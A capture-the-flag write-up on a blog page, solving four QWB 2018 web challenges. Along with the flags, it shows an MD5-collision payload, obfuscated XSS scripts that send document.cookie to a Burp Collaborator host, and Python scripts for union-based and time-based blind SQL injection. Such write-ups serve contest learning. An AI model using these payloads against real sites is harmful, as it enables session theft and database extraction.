@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web 签到12345&amp;lt;!--if($_POST[&amp;apos;param1&amp;apos;]!=$_POST[&amp;apos;param2&amp;apos;] &amp;amp;&amp;amp; md5($_POST[&amp;apos;param1&amp;apos;])==md5($_POST[&amp;apos;param2&amp;apos;]))&amp;#123;die(&amp;quot;success!&amp;quot;);&amp;#125;--&amp;gt; md5">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯-ctf-2018">
+<meta property="og:url" content="http://ultramangaia.github.io/blog/2018/强网杯-ctf-2018.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:description" content="web 签到12345&amp;lt;!--if($_POST[&amp;apos;param1&amp;apos;]!=$_POST[&amp;apos;param2&amp;apos;] &amp;amp;&amp;amp; md5($_POST[&amp;apos;param1&amp;apos;])==md5($_POST[&amp;apos;param2&amp;apos;]))&amp;#123;die(&amp;quot;success!&amp;quot;);&amp;#125;--&amp;gt; md5">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ultramangaia.github.io/img/qwb2018/1.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/qwb2018/2.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/qwb2018/3.png">
+<meta property="og:updated_time" content="2018-04-15T04:51:40.995Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="强网杯-ctf-2018">
+<meta name="twitter:description" content="web 签到12345&amp;lt;!--if($_POST[&amp;apos;param1&amp;apos;]!=$_POST[&amp;apos;param2&amp;apos;] &amp;amp;&amp;amp; md5($_POST[&amp;apos;param1&amp;apos;])==md5($_POST[&amp;apos;param2&amp;apos;]))&amp;#123;die(&amp;quot;success!&amp;quot;);&amp;#125;--&amp;gt; md5">
+<meta name="twitter:image" content="http://ultramangaia.github.io/img/qwb2018/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://ultramangaia.github.io/blog/2018/强网杯-ctf-2018.html"/>
+
+
+
+
+
+  <title>强网杯-ctf-2018 | UltramanGaia's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">UltramanGaia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2018/强网杯-ctf-2018.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="UltramanGaia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UltramanGaia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">强网杯-ctf-2018</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-30T12:47:57+08:00">
+                2018-03-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="web-签到"><a href="#web-签到" class="headerlink" title="web 签到"></a>web 签到</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>md5碰撞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%96%0B%1D%D1%DCA%7B%9C%E4%D8%97%F4ZeU%D55s%9A%C7%F0%EB%FD%0C0%29%F1f%D1%09%B1%8Fu%27%7Fy0%D5%5C%EB%22%E8%AD%BAy%CC%15%5C%EDt%CB%DD_%C5%D3m%B1%9B%0A%D85%CC%A7%E3&amp;param2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%96%0B%1D%D1%DCA%7B%9C%E4%D8%97%F4ZeU%D55s%9AG%F0%EB%FD%0C0%29%F1f%D1%09%B1%8Fu%27%7Fy0%D5%5C%EB%22%E8%AD%BAyL%15%5C%EDt%CB%DD_%C5%D3m%B1%9B%0AX5%CC%A7%E3</span><br></pre></td></tr></table></figure>
+<p>提交三次就能够拿到flag了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">success! flag is QWB&#123;s1gns1gns1gnaftermd5&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/qwb2018/1.png" alt=""></p>
+<h2 id="Share-your-mind"><a href="#Share-your-mind" class="headerlink" title="Share your mind"></a>Share your mind</h2><p>Orz,一开始发现了report页面的那个xss，然后发现拿不到cookie，然后各种迷。</p>
+<p>后来，发现存在RPO问题。</p>
+<p>首先，Write your ideas那里写个javascript代码，注意&lt;,&gt;,’,”被编码了。</p>
+<p>如，<a href="http://39.107.33.96:20000/index.php/view/article/632" target="_blank" rel="noopener">http://39.107.33.96:20000/index.php/view/article/632</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
+<p>访问这个网址可以触发xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/632/..%2f..%2f..%2f..%2f</span><br></pre></td></tr></table></figure>
+<p><img src="/img/qwb2018/2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,34,104,116,116,112,58,47,47,121,112,114,105,108,57,54,118,113,112,113,99,54,119,107,100,56,115,53,57,107,105,104,108,57,99,102,51,51,115,46,98,117,114,112,99,111,108,108,97,98,111,114,97,116,111,114,46,110,101,116,47,99,111,111,107,105,101,46,97,115,112,63,109,115,103,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/633/..%2f..%2f..%2f..%2f</span><br></pre></td></tr></table></figure>
+<p>提交这个url拿到cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br></pre></td></tr></table></figure>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(102,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,102,46,115,114,99,61,34,47,81,87,66,95,102,108,52,103,47,81,87,66,47,34,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,98,111,100,121,34,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,102,41,59,102,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,99,115,56,119,111,110,57,57,116,51,116,113,57,97,110,114,98,54,56,110,110,119,107,122,99,113,105,106,54,56,46,98,117,114,112,99,111,108,108,97,98,111,114,97,116,111,114,46,110,101,116,47,99,111,111,107,105,101,46,112,104,112,63,109,115,103,61,34,43,102,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59,125));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=QWB&#123;flag_is_f43kth4rpo&#125;; HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h2><p>很容易发现age那里有注入</p>
+<p>写个脚本跑一波</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import uuid</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">reg_url = &quot;http://39.107.32.29:10000/index.php?func=register&quot;</span><br><span class="line">log_url = &quot;http://39.107.32.29:10000/index.php?func=login&quot;</span><br><span class="line">pro_url = &quot;http://39.107.32.29:10000/profile.php&quot;</span><br><span class="line">cookies = &#123;&quot;PHPSESSID&quot;:&quot;tfu105n7m92qs0d821on4nspo6&quot;&#125;</span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	prefex = str(uuid.uuid1())[0:5]</span><br><span class="line">	n = 1</span><br><span class="line">	while True:</span><br><span class="line">		query = raw_input(&quot;&gt; &quot;)</span><br><span class="line">		# query = query.replace(&apos; &apos;,&apos;+&apos;)</span><br><span class="line">		query = &quot;1 and 1=2 union select 1,(%s),3,4-- data&quot;%query</span><br><span class="line">		query = str(binascii.hexlify(query))</span><br><span class="line">		# print query</span><br><span class="line">		# break</span><br><span class="line">		user = &quot;%s%d&quot;%(prefex, n)</span><br><span class="line">		requests.post(url = reg_url,cookies=cookies,data = &#123;&quot;username&quot;:user,&quot;age&quot;:&quot;0x%s&quot;%query,&quot;password&quot;:&quot;hello&quot;&#125;,proxies=proxies)</span><br><span class="line">		requests.post(url = log_url, cookies=cookies,data = &#123;&quot;username&quot;:user,&quot;password&quot;:&quot;hello&quot;&#125;,proxies=proxies)</span><br><span class="line">		r = requests.get(url = pro_url, cookies=cookies,proxies=proxies)</span><br><span class="line">		</span><br><span class="line">		m = re.findall(r&apos;whose name is &lt;a&gt;(.*)&lt;/a&gt; is also&apos;,r.content)</span><br><span class="line">		for result in m:</span><br><span class="line">			print result</span><br><span class="line">		n += 1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/qwb2018/3.png" alt=""></p>
+<h2 id="Python-is-the-best-language-1"><a href="#Python-is-the-best-language-1" class="headerlink" title="Python is the best language 1"></a>Python is the best language 1</h2><p>在发say something那里有sql注入</p>
+<p>写个基于时间的盲注脚本，注意需要替换下cookie和csrf_token</p>
+<p>可能昨晚比较夜，比较稳定来着，后面测试貌似有点不稳定，可能要测试几次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">cookies = &#123;&quot;session&quot;:&quot;1cc7cfd5-f3bb-4c18-b966-a9ddbeb54d60&quot;&#125;</span><br><span class="line"></span><br><span class="line">csrf_token = &quot;Ijg2Yjc1ZjhkMzljNzQ3ZDExNzMwYjI4Y2MwYzliMTk3OTBjNDQ1ODMi.DZlTBg.ScINRqfY5Z0acRfUt059ujAM5Ks&quot;</span><br><span class="line"></span><br><span class="line">url = &quot;http://117.50.16.51:20000/index&quot;</span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line"></span><br><span class="line">def check(url,data):</span><br><span class="line">	try:</span><br><span class="line">		r = requests.post(url = url,proxies=proxies,data=data,cookies=cookies,timeout=2.5)</span><br><span class="line">	except Exception, e:</span><br><span class="line">		# print e</span><br><span class="line">		return True</span><br><span class="line">	return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		query = raw_input(&quot;&gt; &quot;)</span><br><span class="line">		# query = query.replace(&apos; &apos;,&apos;+&apos;)</span><br><span class="line"></span><br><span class="line">		result = &quot;&quot;</span><br><span class="line">		n=1</span><br><span class="line">		while True:</span><br><span class="line">			flag = False</span><br><span class="line">			left  = 0 </span><br><span class="line">			right = 127</span><br><span class="line">			while True:</span><br><span class="line">				mid = (left + right) / 2</span><br><span class="line">				print(&quot;l:%d,m:%d,r:%d&quot;%(left,mid,right))</span><br><span class="line">				if(mid == 0 or mid == 256):</span><br><span class="line">					break</span><br><span class="line">				if(mid == left):</span><br><span class="line">					result += chr(mid)</span><br><span class="line">					flag = True</span><br><span class="line">					print &quot;current result is: &quot; + result</span><br><span class="line">					break</span><br><span class="line">				data = &#123;&quot;csrf_token&quot;:csrf_token</span><br><span class="line">					,&quot;post&quot;:&quot;ggtext&apos; or if(ord(mid((%s),%d,1))&lt;%d,sleep(3),1) or &apos;1&apos;=&apos;2&quot;%(query,n,mid),&quot;submit&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">				if check(url,data):</span><br><span class="line">					right = mid</span><br><span class="line">				else:</span><br><span class="line">					left = mid</span><br><span class="line"></span><br><span class="line">			if(not flag):</span><br><span class="line">				break</span><br><span class="line">			n += 1</span><br></pre></td></tr></table></figure>
+<p>可以拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWB&#123;us1ng_val1dator_caut1ous&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2018/PHP免杀思路.html" rel="next" title="PHP免杀思路">
+                <i class="fa fa-chevron-left"></i> PHP免杀思路
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2018/0ctf-ctf-2018.html" rel="prev" title="0ctf-ctf-2018">
+                0ctf-ctf-2018 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="UltramanGaia" />
+            
+              <p class="site-author-name" itemprop="name">UltramanGaia</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web-签到"><span class="nav-number">1.</span> <span class="nav-text">web 签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Share-your-mind"><span class="nav-number">2.</span> <span class="nav-text">Share your mind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Three-hit"><span class="nav-number">3.</span> <span class="nav-text">Three hit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-is-the-best-language-1"><span class="nav-number">4.</span> <span class="nav-text">Python is the best language 1</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
